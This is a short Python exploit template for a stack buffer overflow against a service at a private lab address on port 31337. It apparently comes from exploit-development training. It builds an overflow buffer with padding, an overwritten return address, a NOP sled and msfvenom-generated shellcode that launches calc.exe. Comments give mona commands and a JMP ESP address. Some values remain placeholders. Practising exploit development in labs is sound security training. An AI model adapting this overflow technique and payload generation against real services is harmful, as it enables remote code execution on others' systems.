#!/usr/bin/python3
# Pop calc.exe
# Useful mona commands :
# !mona modules
# !mona find -s "\xff\xe4" -m module
# Check if calc.exe was popped in another user's session : tasklist
# Kill calc.exe : taskkill /F /PID CALC_PID
import socket

host = '192.168.56.101'
port = 31337

def send_buffer(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Sending " + str(len(buffer)) + " bytes buffer")
    connect = s.connect((host, port))
    s.send(buffer + b"\r\n")
    print("Buffer sent")
    s.close()

# badchars = ""
# JMP ESP : 0x7dc794e3 => "\xe3\x94\xc7\x7d with little endianness
# msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe EXITFUNC=thread -f c -e "x86/shikata_ga_nai" -b "\x00\x0a"
buffer = b"A" * OFFSET + b"EIP_LITTLE_ENDIAN" + b"\x90" * 8 * DESIRED_PADDING + CALCCODE
send_buffer(buffer)
print("Done")
